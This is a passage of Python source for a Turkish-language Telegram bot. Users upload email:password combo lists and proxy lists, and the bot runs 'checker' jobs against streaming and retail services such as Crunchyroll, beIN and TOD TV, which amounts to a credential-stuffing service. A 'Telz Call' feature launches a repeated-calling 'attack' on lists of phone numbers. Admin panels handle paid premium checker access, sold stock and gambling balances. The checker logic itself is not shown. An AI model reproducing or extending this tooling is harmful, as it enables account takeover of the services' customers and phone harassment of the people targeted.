      safe_tg(bot.send_message, chat_id, err, parse_mode="Markdown")
      return
    _launch_checker_job(chat_id, user_id, combo_text, run_barlas_check_and_send, "BARLAS")
    return

  elif state == "waiting_idefix":
    combo_text, err = _extract_combo_from_message(message, chat_id, "IDEFIX")
    if err == "IPTAL":
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, "❌ İptal.")
      return
    if err:
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, err, parse_mode="Markdown")
      return
    _launch_checker_job(chat_id, user_id, combo_text, run_idefix_check_and_send, "IDEFIX")
    return

  elif state == "waiting_oyuncustore":
    combo_text, err = _extract_combo_from_message(message, chat_id, "OYUNCUSTORE")
    if err == "IPTAL":
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, "❌ İptal.")
      return
    if err:
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, err, parse_mode="Markdown")
      return
    _launch_checker_job(chat_id, user_id, combo_text, run_oyuncustore_check_and_send, "OYUNCUSTORE")
    return

  elif state == "waiting_oyundinar":
    combo_text, err = _extract_combo_from_message(message, chat_id, "OYUNDINAR")
    if err == "IPTAL":
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, "❌ İptal.")
      return
    if err:
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, err, parse_mode="Markdown")
      return
    _launch_checker_job(chat_id, user_id, combo_text, run_oyundinar_check_and_send, "OYUNDINAR")
    return

  elif state == "waiting_smsonaycom":
    combo_text, err = _extract_combo_from_message(message, chat_id, "SMSONAYCOM")
    if err == "IPTAL":
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, "❌ İptal.")
      return
    if err:
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, err, parse_mode="Markdown")
      return
    _launch_checker_job(chat_id, user_id, combo_text, run_smsonaycom_check_and_send, "SMSONAYCOM")
    return

  elif state == "waiting_todtv":
    combo_text, err = _extract_combo_from_message(message, chat_id, "TODTV")
    if err == "IPTAL":
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, "❌ İptal.")
      return
    if err:
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, err, parse_mode="Markdown")
      return
    _launch_checker_job(chat_id, user_id, combo_text, run_todtv_check_and_send, "TODTV")
    return

  elif state == "waiting_bein":
    combo_text, err = _extract_combo_from_message(message, chat_id, "BEIN")
    if err == "IPTAL":
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, "❌ İptal.")
      return
    if err:
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, err, parse_mode="Markdown")
      return
    _launch_checker_job(chat_id, user_id, combo_text, run_bein_check_and_send, "BEIN")
    return

  elif state == "waiting_ssport":
    combo_text, err = _extract_combo_from_message(message, chat_id, "SSPORT")
    if err == "IPTAL":
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, "❌ İptal.")
      return
    if err:
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, err, parse_mode="Markdown")
      return
    _launch_checker_job(chat_id, user_id, combo_text, run_ssport_check_and_send, "SSPORT")
    return

  elif state == "waiting_tabii":
    combo_text, err = _extract_combo_from_message(message, chat_id, "TABII")
    if err == "IPTAL":
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, "❌ İptal.")
      return
    if err:
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, err, parse_mode="Markdown")
      return
    _launch_checker_job(chat_id, user_id, combo_text, run_tabii_check_and_send, "TABII")
    return

  elif state == "waiting_global_proxy":
    proxy_text = None
    if message.document:
      try:
        fname = (message.document.file_name or "").lower()
        if not (fname.endswith((".txt", ".log", ".csv", ".list")) or (message.document.mime_type or "").startswith("text") or not fname):
          bot.send_message(chat_id, "❌ Proxy için **.txt** gönder.", parse_mode="Markdown"); return
        file_info = bot.get_file(message.document.file_id)
        downloaded = bot.download_file(file_info.file_path)
        payload = downloaded if isinstance(downloaded, (bytes, bytearray)) else str(downloaded).encode("utf-8", errors="ignore")
        proxy_text = payload.decode("utf-8", errors="ignore")
      except Exception as e:
        log_error("waiting_global_proxy_doc", e); bot.send_message(chat_id, f"❌ {e}"); return
    elif message.text:
      if message.text.strip().lower() in ("/iptal", "iptal", "/cancel", "cancel"):
        user_states.pop(chat_id, None); bot.send_message(chat_id, "❌ İptal."); return
      proxy_text = message.text.strip()
    else:
      bot.send_message(chat_id, "❌ Proxy metin/.txt · /iptal", parse_mode="Markdown"); return
    proxies = _cr_parse_proxy_list(proxy_text or "")
    if not proxies:
      bot.send_message(chat_id, "❌ Geçerli proxy yok. Format: `ip:port`", parse_mode="Markdown"); return
    set_user_proxies(user_id, proxies)
    user_states.pop(chat_id, None)
    bot.send_message(
      chat_id,
      f"🔗 **{len(proxies)} proxy** kaydedildi.\nTüm checkerlarda otomatik rotasyon.\nTemizle: Checker menü → Proxysiz devam",
      parse_mode="Markdown",
    )
    return

  elif state == "waiting_cr_proxy":
    proxy_text = None
    if message.document:
      try:
        fname = (message.document.file_name or "").lower()
        if not (fname.endswith((".txt", ".log", ".csv", ".list")) or (message.document.mime_type or "").startswith("text") or not fname):
          bot.send_message(chat_id, "❌ Proxy için **.txt** gönder.", parse_mode="Markdown"); return
        file_info = bot.get_file(message.document.file_id)
        downloaded = bot.download_file(file_info.file_path)
        payload = downloaded if isinstance(downloaded, (bytes, bytearray)) else str(downloaded).encode("utf-8", errors="ignore")
        proxy_text = payload.decode("utf-8", errors="ignore")
      except Exception as e:
        log_error("waiting_cr_proxy_doc", e); bot.send_message(chat_id, f"❌ {e}"); return
    elif message.text:
      if message.text.strip().lower() in ("/iptal", "iptal", "/cancel", "cancel"):
        user_states.pop(chat_id, None); bot.send_message(chat_id, "❌ İptal."); return
      proxy_text = message.text.strip()
    else:
      bot.send_message(chat_id, "❌ Proxy metin/.txt · /iptal", parse_mode="Markdown"); return
    proxies = _cr_parse_proxy_list(proxy_text or "")
    if not proxies:
      bot.send_message(chat_id, "❌ Geçerli proxy yok. Format: `ip:port`", parse_mode="Markdown"); return
    admin_temp_data[chat_id] = admin_temp_data.get(chat_id, {})
    admin_temp_data[chat_id]["cr_proxies"] = proxies
    user_states[chat_id] = "waiting_crunchyroll"
    bot.send_message(
      chat_id,
      f"🔗 **{len(proxies)} proxy** alındı.\\n\\n"
      f"🍥 Şimdi combo gönder (`email:şifre`)\\n"
      f"Metin veya 📎 `.txt`\\n🛑 Durdur var\\n\\nİptal: /iptal",
      parse_mode="Markdown",
    )
    return

  elif state == "waiting_crunchyroll":
    combo_text, err = _extract_combo_from_message(message, chat_id, "CRUNCHYROLL")
    if err == "IPTAL":
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, "❌ İptal.")
      return
    if err:
      user_states.pop(chat_id, None)
      safe_tg(bot.send_message, chat_id, err, parse_mode="Markdown")
      return
    if not combo_text or not str(combo_text).strip():
      safe_tg(bot.send_message, chat_id, "❌ Boş combo.")
      return
    def _run_cr(cid, uid, txt):
      run_crunchyroll_check_and_send(cid, uid, txt, proxies=get_user_proxies(uid))
    ask_checker_speed(chat_id, user_id, str(combo_text).strip(), _run_cr, "CRUNCHYROLL")
    return

  elif state == "waiting_telz_numbers":
    if not message.text:
      bot.send_message(chat_id, "❌ Numara yaz veya /iptal")
      return
    if message.text.strip().lower() in ("/iptal", "iptal", "/cancel", "cancel"):
      user_states.pop(chat_id, None)
      admin_temp_data.pop(chat_id, None)
      bot.send_message(chat_id, "❌ İptal edildi.")
      return
    raw_nums = [n.strip() for n in message.text.splitlines() if n.strip()]
    if not raw_nums:
      bot.send_message(chat_id, "❌ Geçerli numara yok.")
      return
    if len(raw_nums) > TELZ_MAX_NUMBERS:
      bot.send_message(
        chat_id,
        f"⚠️ Max **{TELZ_MAX_NUMBERS}** numara — ilk {TELZ_MAX_NUMBERS} alındı.",
        parse_mode="Markdown",
      )
      raw_nums = raw_nums[:TELZ_MAX_NUMBERS]
    admin_temp_data[chat_id] = {"telz_numbers": raw_nums}
    user_states[chat_id] = "waiting_telz_times"
    max_t = telz_max_times_for(user_id)
    if max_t is None:
      hint = "Admin: istediğin sayı (örn. 50)"
    else:
      hint = f"1 ile **{max_t}** arası yaz"
    bot.send_message(
      chat_id,
      f"📞 **Telz Call** — Adım 2/2\n\n"
      f"📦 **{len(raw_nums)}** numara kaydedildi.\n"
      f"🔁 **Kaç kere** gönderilsin?\n{hint}\n\n"
      f"İptal: /iptal",
      parse_mode="Markdown",
    )
    return

  elif state == "waiting_telz_times":
    if not message.text:
      bot.send_message(chat_id, "❌ Sayı yaz (kaç kere) veya /iptal")
      return
    if message.text.strip().lower() in ("/iptal", "iptal", "/cancel", "cancel"):
      user_states.pop(chat_id, None)
      admin_temp_data.pop(chat_id, None)
      bot.send_message(chat_id, "❌ İptal edildi.")
      return
    try:
      times = int(message.text.strip())
    except Exception:
      bot.send_message(chat_id, "❌ Geçerli bir sayı yaz (örn: 5)")
      return
    if times < 1:
      bot.send_message(chat_id, "❌ En az 1 olmalı.")
      return
    max_t = telz_max_times_for(user_id)
    if max_t is not None and times > max_t:
      bot.send_message(
        chat_id,
        f"❌ Kullanıcı limiti: max **{max_t}** kere.\n"
        f"Admin sınırsız.",
        parse_mode="Markdown",
      )
      return
    raw_nums = (admin_temp_data.get(chat_id) or {}).get("telz_numbers") or []
    if not raw_nums:
      user_states.pop(chat_id, None)
      bot.send_message(chat_id, "❌ Numara kaydı yok. Baştan başla.")
      return
    user_states.pop(chat_id, None)
    admin_temp_data.pop(chat_id, None)
    bot.send_message(
      chat_id,
      f"📞 Başlıyor...\n"
      f"📦 **{len(raw_nums)}** numara × **{times}** tekrar\n"
      f"⏳ Biraz bekle.",
      parse_mode="Markdown",
    )

    def _run_telz():
      try:
        res_list = telz_saldiri_baslat(raw_nums, times=times)
        text = "📞 **Telz sonuç**\n\n" + "\n".join(res_list)
        if len(text) > 3500:
          text = text[:3500] + "\n…"
        bot.send_message(chat_id, text, parse_mode="Markdown")
      except Exception as e:
        log_error("telz_run", e)
        try:
          bot.send_message(chat_id, f"❌ Telz hatası: {e}")
        except Exception:
          pass
      log_activity("telz_call", user_id, f"n={len(raw_nums)} x{times}")

    threading.Thread(target=_run_telz, daemon=True).start()
    return

  if user_id in admin_ids_set:

    if state == "waiting_admin_add_admin_id":
      if message.text.isdigit():
        new_admin = int(message.text)
        admin_ids_set.add(new_admin)
        banned_users.discard(new_admin)
        temp_banned_users.pop(new_admin, None)
        save_data()
        bot.send_message(chat_id, f"✅ `{new_admin}` başarıyla yönetici yapıldı.")
      user_states.pop(chat_id, None)
      return

    elif state == "waiting_admin_remove_id":
      if message.text.isdigit():
        rem_admin = int(message.text)
        if rem_admin in admin_ids_set:
          if int(rem_admin) in LOCKED_ADMIN_IDS or int(rem_admin) in set(DEFAULT_ADMINS):
            bot.send_message(chat_id, "❌ Bu admin kilitli — çıkarılamaz.")
            user_states.pop(chat_id, None)
            return
          admin_ids_set.remove(rem_admin)
          save_data()
          bot.send_message(chat_id, f"✅ `{rem_admin}` yöneticilikten çıkarıldı.")
        else:
          bot.send_message(chat_id, "❌ Kullanıcı zaten admin değil.")
      user_states.pop(chat_id, None)
      return

    elif state == "waiting_admin_temp_ban_id":
      if message.text.isdigit():
        target = int(message.text)
        if target in admin_ids_set:
          bot.send_message(chat_id, "❌ Yönetici yetkisine sahip bir kullanıcı banlanamaz!")
        else:
          temp_banned_users[target] = time.time() + 86400
          save_data()
          bot.send_message(chat_id, f"⏳ `{target}` ID'li kullanıcı 1 gün banlandı.")
      user_states.pop(chat_id, None)
      return

    elif state == "waiting_admin_stock_content":
      item_key = (admin_temp_data.get(chat_id) or {}).get("stock_item_key")
      if not item_key or item_key not in market_data or "stock_file" not in market_data[item_key]:
        user_states.pop(chat_id, None)
        admin_temp_data.pop(chat_id, None)
        bot.send_message(chat_id, "❌ Ürün seçimi kayboldu, stok menüsünden tekrar dene.")
        return
      raw_text = ""
      if message.document:
        fname = (message.document.file_name or "").lower()
        if not (fname.endswith((".txt", ".csv", ".log")) or (message.document.mime_type or "").startswith("text")):
          bot.send_message(chat_id, "❌ `.txt` / `.csv` dosyası gönder veya satır satır yaz.")
          return
        try:
          fi = bot.get_file(message.document.file_id)
          data = bot.download_file(fi.file_path)
          if isinstance(data, bytes):
            raw_text = data.decode("utf-8", errors="ignore")
          else:
            raw_text = str(data)
        except Exception as e:
          bot.send_message(chat_id, f"❌ Dosya indirilemedi: {e}")
          return
      elif message.text:
        if message.text.strip().lower() in ("/iptal", "iptal", "cancel"):
          user_states.pop(chat_id, None)
          admin_temp_data.pop(chat_id, None)
          bot.send_message(chat_id, "❌ İptal.")
          return
        raw_text = message.text
      else:
        bot.send_message(chat_id, "📝 Stok satırlarını yaz **veya** 📎 `.txt` dosyası gönder.\n/iptal")
        return
      lines = [line.strip() for line in raw_text.splitlines() if line.strip()]
      if not lines:
        bot.send_message(chat_id, "❌ Boş stok.")
        return
      add_stocks_to_file(market_data[item_key]["stock_file"], lines)
      user_states.pop(chat_id, None)
      admin_temp_data.pop(chat_id, None)
      bot.send_message(
        chat_id,
        f"✅ **{len(lines)}** adet stok eklendi → `{market_data[item_key].get('name')}`\n"
        f"Toplam stok: **{len(get_stock_list(market_data[item_key]['stock_file']))}**",
        parse_mode="Markdown",
      )
      return

    elif state == "waiting_bulk_ban":
      raw = (message.text or "").replace(",", " ").replace(";", " ")
      ids = []
      for part in raw.split():
        part = part.strip()
        if part.isdigit():
          ids.append(int(part))
      banned_n = 0
      for tid in ids:
        if tid in admin_ids_set:
          continue
        banned_users.add(tid)
        temp_banned_users.pop(tid, None)
        banned_n += 1
      save_data()
      log_activity("bulk_ban", user_id, f"{banned_n} users")
      bot.send_message(chat_id, f"🚫 **{banned_n}** kullanıcı kalıcı banlandı.")
      user_states.pop(chat_id, None)
      return

    elif state == "waiting_bulk_del_bal":
      raw = (message.text or "").replace(",", " ").replace(";", " ")
      ids = []
      for part in raw.split():
        part = part.strip()
        if part.isdigit():
          ids.append(int(part))
      cleared = 0
      for tid in ids:
        user_balances[tid] = 0.0
        ref_balances[tid] = 0.0
        user_gamble_balances[tid] = 0.0
        cleared += 1
      save_data()
      log_activity("bulk_del_bal", user_id, f"{cleared} users")
      bot.send_message(chat_id, f"🗑️ **{cleared}** kullanıcının bakiyesi sıfırlandı (normal+ref+kumar).")
      user_states.pop(chat_id, None)
      return

    elif state == "waiting_admin_ban_id":
      if message.text.isdigit():
        target = int(message.text)
        if target in admin_ids_set:
          bot.send_message(chat_id, "❌ Yönetici yetkisine sahip bir kullanıcı banlanamaz!")
        else:
          banned_users.add(target)
          temp_banned_users.pop(target, None)
          save_data()
          bot.send_message(chat_id, f"🚫 `{target}` kalıcı banlandı.")
      user_states.pop(chat_id, None)
      return

    elif state == "waiting_admin_unban_id":
      if message.text.isdigit():
        target = int(message.text)
        was_hard = target in hard_banned_users
        hard_banned_users.discard(target)
        banned_users.discard(target)
        temp_banned_users.pop(target, None)
        support_warns.pop(target, None)
        save_data()
        if was_hard:
          bot.send_message(chat_id, f"✅ `{target}` **SÜPER BAN** kaldırıldı.", parse_mode="Markdown")
        else:
          bot.send_message(chat_id, f"✅ `{target}` banı kaldırıldı.")
        try:
          bot.send_message(target, "✅ Banınız kaldırıldı. Botu tekrar kullanabilirsiniz.")
        except Exception:
          pass
      user_states.pop(chat_id, None)
      return

    elif state == "waiting_admin_del_bal_id":
      if message.text.isdigit():
        target = int(message.text)
        user_balances[target] = 0.0
        ref_balances[target] = 0.0
        save_data()
        bot.send_message(chat_id, f"🗑️ `{target}` bakiyesi sıfırlandı.")
      user_states.pop(chat_id, None)
      return

    elif state == "waiting_admin_warn_user":
      parts = message.text.split(" ", 1)
      if parts[0].isdigit():
        target = int(parts[0])
        warn_msg = parts[1] if len(parts) > 1 else "Kurallara uyunuz!"
        try:
          bot.send_message(target, f"⚠️ **YÖNETİCİ UYARISI:**\n\n{warn_msg}", parse_mode="Markdown")
          bot.send_message(chat_id, "✅ Uyarı gönderildi.")
        except:
          bot.send_message(chat_id, "❌ Kullanıcıya ulaşılamadı.")
      user_states.pop(chat_id, None)
      return

    elif state == "waiting_admin_coupon_code":
      if not message.text:
        bot.send_message(chat_id, "❌ Lütfen kupon kodunu yazın (örnek: BONUS50).")
        return
      c_code = message.text.strip().upper()
      c_code = "".join(ch for ch in c_code if ch.isalnum() or ch in ("_", "-", "."))
      if not c_code or len(c_code) < 2:
        bot.send_message(chat_id, "❌ Geçersiz kupon kodu!\nEn az 2 karakter, sadece harf/rakam/_/- kullanın.")
        return
      if len(c_code) > 32:
        bot.send_message(chat_id, "❌ Kupon kodu en fazla 32 karakter olabilir.")
        return
      if any(str(k).strip().upper() == c_code for k in coupons.keys()):
        bot.send_message(chat_id, f"⚠️ `{c_code}` kodu zaten var. Devam ederseniz eski değer güncellenir.\n💵 Yeni **bakiye değerini (TL)** yazın:", parse_mode="Markdown")
      else:
        bot.send_message(chat_id, f"💵 Kupon kodu: `{c_code}`\nŞimdi **bakiye değerini (TL)** yazın (örnek: 25 veya 10.5):", parse_mode="Markdown")
      admin_temp_data[chat_id] = {'new_coupon_code': c_code}
      user_states[chat_id] = "waiting_admin_coupon_amount"
      return

    elif state == "waiting_admin_coupon_amount":
      if not message.text:
        bot.send_message(chat_id, "❌ Lütfen sayısal bir tutar yazın (örnek: 25).")
        return
      try:
        c_val = float(message.text.replace(",", ".").strip())
      except Exception:
        bot.send_message(chat_id, "❌ Geçersiz bakiye miktarı.\nÖrnek: `25` veya `10.5` yazın.", parse_mode="Markdown")
        return
      if c_val <= 0:
        bot.send_message(chat_id, "❌ Tutar 0'dan büyük olmalı.")
        return
      if c_val > 100000:
        bot.send_message(chat_id, "❌ Tutar çok yüksek (max 100000 TL).")
        return
      admin_temp_data.setdefault(chat_id, {})["new_coupon_value"] = c_val
      user_states[chat_id] = "waiting_admin_coupon_uses"
      bot.send_message(chat_id, "🔢 **Kaç kez kullanılabilsin?**\nÖrnek: `1` (tek), `50` (çok kullanımlı), `0` = sınırsız", parse_mode="Markdown")
      return

    elif state == "waiting_admin_coupon_uses":
      if not message.text:
        bot.send_message(chat_id, "❌ Sayı yazın.")
        return
      try:
        uses = int(message.text.strip())
      except Exception:
        bot.send_message(chat_id, "❌ Geçerli bir sayı yazın (örn: 1 veya 100).")
        return
      if uses < 0:
        bot.send_message(chat_id, "❌ Negatif olamaz.")
        return
      if uses == 0:
        uses = 999999  # sınırsız pratik
      admin_temp_data.setdefault(chat_id, {})["new_coupon_uses"] = uses
      user_states[chat_id] = "waiting_admin_coupon_expire"
      bot.send_message(chat_id, "📅 **Son kullanma tarihi** (YYYY-MM-DD) yazın.\nSüresiz için `0` veya `yok` yazın.\nÖrnek: `2026-12-31`", parse_mode="Markdown")
      return

    elif state == "waiting_admin_coupon_expire":
      if not message.text:
        bot.send_message(chat_id, "❌ Tarih veya `0` yazın.")
        return
      raw = message.text.strip().lower()
      expires_at = None
      if raw not in ("0", "yok", "y", "none", "-"):
        try:
          datetime.strptime(raw, "%Y-%m-%d")
          expires_at = raw
        except Exception:
          bot.send_message(chat_id, "❌ Format: YYYY-MM-DD veya `0`")
          return
      c_code = admin_temp_data.get(chat_id, {}).get("new_coupon_code")
      c_val = admin_temp_data.get(chat_id, {}).get("new_coupon_value")
      c_uses = admin_temp_data.get(chat_id, {}).get("new_coupon_uses", 1)
      if not c_code or c_val is None:
        bot.send_message(chat_id, "❌ Kupon verisi eksik. Yeniden oluşturun.")
        user_states.pop(chat_id, None)
        admin_temp_data.pop(chat_id, None)
        return
      for k in list(coupons.keys()):
        if normalize_coupon(k) == normalize_coupon(c_code):
          del coupons[k]
      coupons[c_code] = {
        "value": float(c_val),
        "max_uses": int(c_uses),
        "used_count": 0,
        "expires_at": expires_at,
        "min_level": 1,
      }
      save_data()
      log_activity("coupon_create", user_id, f"{c_code}:{c_val}:uses={c_uses}")
      user_states.pop(chat_id, None)
      admin_temp_data.pop(chat_id, None)
      uses_txt = "Sınırsız" if c_uses >= 999999 else str(c_uses)
      exp_txt = expires_at or "Süresiz"
      markup = types.InlineKeyboardMarkup(row_width=1)
      markup.add(
        types.InlineKeyboardButton("🎟️ Başka Kupon Oluştur", callback_data="admin_create_coupon"),
        types.InlineKeyboardButton("📋 Aktif Kuponları Listele", callback_data="admin_list_coupons"),
        types.InlineKeyboardButton("🔙 Admin Panel", callback_data="menu_admin")
      )
      bot.send_message(
        chat_id,
        f"✅ **Kupon oluşturuldu!**\n\n🎟️ Kod: `{c_code}`\n💵 Değer: **{c_val:.2f} TL**\n🔢 Kullanım: **{uses_txt}**\n📅 Son tarih: **{exp_txt}**\n📦 Aktif: **{len(coupons)}**",
        reply_markup=markup,
        parse_mode="Markdown"
      )
      return

    elif state == "waiting_broadcast":
      b_text = None
      if message.text and message.text.strip():
        b_text = message.text.strip()
      elif message.caption and message.caption.strip():
        b_text = message.caption.strip()
      photo_id = message.photo[-1].file_id if message.photo else None

      if not b_text and not photo_id:
        bot.send_message(chat_id, "❌ Boş duyuru gönderilemez. Metin yazın veya fotoğraf+yazı gönderin.")
        return

      if not b_text:
        b_text = ""

      user_states.pop(chat_id, None)
      bot.send_message(chat_id, "📢 Duyuru gönderimi başlatıldı...")
      success = 0
      targets = set(registered_users) | set(user_credentials.keys())
      for u in targets:
        try:
          msg = f"📢 **DUYURU**\n\n{b_text}" if b_text else "📢 **DUYURU**"
          if photo_id:
            bot.send_photo(u, photo_id, caption=msg[:1024], parse_mode="Markdown")
          else:
            try:
              bot.send_message(u, msg, parse_mode="Markdown")
            except:
              bot.send_message(u, f"📢 DUYURU\n\n{b_text}")
          success += 1
        except:
          pass
      bot.send_message(chat_id, f"✅ Duyuru **{success}** kullanıcıya iletildi.")
      log_activity("broadcast", user_id, f"{success} users")
      return

    elif state == "waiting_admin_prem_grant_id":
      if user_id not in admin_ids_set:
        user_states.pop(chat_id, None)
        return
      raw = (message.text or "").strip()
      if not raw.isdigit():
        bot.send_message(chat_id, "❌ Sadece sayısal ID yaz.")
        return
      target = int(raw)
      plan_key = (admin_temp_data.get(chat_id) or {}).get("admin_prem_plan") or "1d"
      ok, msg = grant_checker_sub(target, plan_key, via="admin_grant")
      user_states.pop(chat_id, None)
      try:
        admin_temp_data.pop(chat_id, None)
      except Exception:
        pass
      if ok:
        bot.send_message(chat_id, f"✅ Premium verildi → `{target}`\n\n{msg}", parse_mode="Markdown")
        try:
          bot.send_message(
            target,
            f"🎁 **Admin sana checker premium verdi!**\n\n{msg}\n\nChecker menüsü açıldı.",
            parse_mode="Markdown",
          )
        except Exception:
          pass
      else:
        bot.send_message(chat_id, f"❌ {msg}")
      return

    elif state == "waiting_admin_prem_revoke_id":
      if user_id not in admin_ids_set:
        user_states.pop(chat_id, None)
        return
      raw = (message.text or "").strip()
      if not raw.isdigit():
        bot.send_message(chat_id, "❌ Sadece sayısal ID yaz.")
        return
      target = int(raw)
      ok = revoke_checker_sub(target, by_admin=user_id)
      user_states.pop(chat_id, None)
      if ok:
        bot.send_message(chat_id, f"✅ Premium iptal → `{target}`", parse_mode="Markdown")
        try:
          bot.send_message(target, "⚠️ Checker aboneliğin admin tarafından **iptal edildi**.", parse_mode="Markdown")
        except Exception:
          pass
      else:
        bot.send_message(chat_id, f"ℹ️ `{target}` için aktif abonelik yok.", parse_mode="Markdown")
      return

    elif state == "waiting_admin_prem_check_id":
      if user_id not in admin_ids_set:
        user_states.pop(chat_id, None)
        return
      raw = (message.text or "").strip()
      if not raw.isdigit():
        bot.send_message(chat_id, "❌ Sadece sayısal ID yaz.")
        return
      target = int(raw)
      user_states.pop(chat_id, None)
      st = checker_sub_status_text(target)
      bot.send_message(chat_id, f"🔍 `{target}`\n\n{st}", parse_mode="Markdown")
      return

    elif state == "waiting_add_balance_id":

      if message.text.isdigit():
        admin_temp_data[chat_id] = {'add_bal_target': int(message.text)}
        user_states[chat_id] = "waiting_add_balance_amount"
        bot.send_message(chat_id, "💵 Eklemek istediğiniz **Bakiye Miktarını (TL)** yazın:")
      else:
        bot.send_message(chat_id, "❌ Geçersiz ID.")
        user_states.pop(chat_id, None)
      return

    elif state == "waiting_add_balance_amount":
      try:
        amt = float(message.text.replace(",", "."))
        target = admin_temp_data.get(chat_id, {}).get('add_bal_target')
        add_norm_bal(target, amt)
        add_balance_history(target, "admin_add", amt, f"by {user_id}")
        log_activity("admin_balance", user_id, f"+{amt} to {target}")
        save_data()
        bot.send_message(
          chat_id,
          f"✅ `{target}` → **+{amt:.2f} TL** (normal)\n"
          f"Yeni normal bakiye: **{get_norm_bal(target):.2f} TL**\n"
          f"_(Kripto borsa bu bakiyeyi kullanır)_",
          parse_mode="Markdown",
        )
        try:
          bot.send_message(target, f"🎉 Hesabınıza yöneticiler tarafından **+{amt:.2f} TL** bakiye tanımlandı!", parse_mode="Markdown")
          add_notification(target, f"+{amt:.2f} TL admin yüklemesi")
        except:
          pass
      except:
        bot.send_message(chat_id, "❌ Geçersiz miktar.")
      user_states.pop(chat_id, None)
      admin_temp_data.pop(chat_id, None)
      return

    elif state == "waiting_add_gamble_id":
      if message.text and message.text.strip().isdigit():
        target = int(message.text.strip())
        admin_temp_data[chat_id] = {"add_gamble_target": target}
        user_states[chat_id] = "waiting_add_gamble_amount"
        bot.send_message(chat_id, f"🎲 `{target}` için eklenecek **kumar bakiyesi** miktarını yazın (TL):", parse_mode="Markdown")
      else:
        bot.send_message(chat_id, "❌ Geçerli Telegram ID yazın.")
      return

    elif state == "waiting_add_gamble_amount":
      try:
        amt = float(message.text.replace(",", "."))
        target = int(admin_temp_data.get(chat_id, {}).get("add_gamble_target"))
        add_gamble_bal(target, amt)
        save_data()
        log_activity("admin_gamble_bal", user_id, f"+{amt} to {target}")
        bot.send_message(chat_id, f"✅ `{target}` kumar bakiyesine **+{amt:.2f} TL** eklendi.\nToplam kumar: **{get_gamble_bal(target):.2f} TL**", parse_mode="Markdown")
        try:
          bot.send_message(target, f"🎲 Kumar bakiyene **+{amt:.2f} TL** eklendi.\nToplam: **{get_gamble_bal(target):.2f} TL**", parse_mode="Markdown")
        except Exception:
          pass
      except Exception:
        bot.send_message(chat_id, "❌ Geçersiz miktar.")
      user_states.pop(chat_id, None)
      admin_temp_data.pop(chat_id, None)
      return

    elif state == "waiting_maint_msg":
      set_maint_msg(message.text.strip())
      bot.send_message(chat_id, f"✅ Bakım mesajı güncellendi:\n{maintenance_message}")
      user_states.pop(chat_id, None)
      return

    elif state == "waiting_earn_proof":
      process_earn_proof(message, chat_id, user_id)
      return

    elif state == "waiting_admin_music_file":
      if user_id not in admin_ids_set:
        user_states.pop(chat_id, None)
        return
      lang = admin_temp_data.get(chat_id, {}).get("upload_music_lang", "tr")
      save_name = LANG_MUSIC_SAVE.get(lang, "welcome.mp3")
      file_id = None
      fname = ""
      if message.audio:
        file_id = message.audio.file_id
        fname = message.audio.file_name or save_name
      elif message.document:
        file_id = message.document.file_id
        fname = message.document.file_name or save_name
        low = (fname or "").lower()
        if not low.endswith((".mp3", ".m4a", ".ogg", ".aac", ".wav")):
          bot.send_message(chat_id, "❌ Sadece ses dosyası gönder (mp3/m4a/ogg).")
          return
      elif message.voice:
        file_id = message.voice.file_id
        fname = save_name
      else:
        bot.send_message(chat_id, "❌ Ses dosyası gönderin veya /iptal yazın.")
        return
      try:
        finfo = bot.get_file(file_id)
        data = bot.download_file(finfo.file_path)
        with open(save_name, "wb") as out:
          out.write(data)
        try:
          os.makedirs("music", exist_ok=True)
          with open(os.path.join("music", save_name), "wb") as out2:
            out2.write(data)
        except Exception:
          pass
        user_states.pop(chat_id, None)
        admin_temp_data.pop(chat_id, None)
        title = LANG_MUSIC_TITLES.get(lang, lang)
        bot.send_message(
          chat_id,
          f"✅ **Şarkı kaydedildi**\n\n{title}\n📁 `{save_name}`\n📦 {format_bytes(len(data))}\n\nDil seçen kullanıcılara gidecek.",
          parse_mode="Markdown"
        )
        log_activity("music_upload", user_id, f"{lang}:{save_name}")
      except Exception as e:
        log_error("music_upload", e)
        bot.send_message(chat_id, f"❌ Yükleme hatası: {e}")
      return

    elif state == "waiting_maint_minutes":
      try:
        minutes = int(str(message.text).strip())
        if minutes < 1 or minutes > 24 * 60:
          bot.send_message(chat_id, "❌ 1 ile 1440 dakika arası yazın.")
          return
        until = set_maintenance_timed(minutes)
        end_str = datetime.fromtimestamp(until).strftime("%d.%m.%Y %H:%M:%S")
        msg = "🔧 **Süreli bakım açıldı**\n\n⏱ **%d dk**\n🏁 Bitiş: **%s**\nKalan: **%s**" % (minutes, end_str, maintenance_remaining_str())
        bot.send_message(chat_id, msg, parse_mode="Markdown")
      except Exception:
        bot.send_message(chat_id, "❌ Geçerli dakika yazın (örn: 45)")
      user_states.pop(chat_id, None)
      return

    elif state == "waiting_withdraw_settings":
      txt = message.text.strip().lower()
      if txt.startswith("min "):
        try:
          set_min_withdraw(float(txt.split()[1]))
          bot.send_message(chat_id, f"✅ Min çekim: **{min_withdraw:.0f} TL**", parse_mode="Markdown")
        except:
          bot.send_message(chat_id, "❌ Kullanım: min 50")
      elif txt.startswith("komisyon "):
        try:
          set_withdraw_commission(float(txt.split()[1]))
          bot.send_message(chat_id, f"✅ Komisyon: **%{withdraw_commission*100:.0f}**", parse_mode="Markdown")
        except:
          bot.send_message(chat_id, "❌ Kullanım: komisyon 0.05")
      else:
        bot.send_message(chat_id, "❌ `min 50` veya `komisyon 0.1` yazın")
      user_states.pop(chat_id, None)
      return

    elif state == "waiting_new_market_key":
      key = message.text.strip().replace(" ", "_")
      if not key or not all(c.isalnum() or c == "_" for c in key):
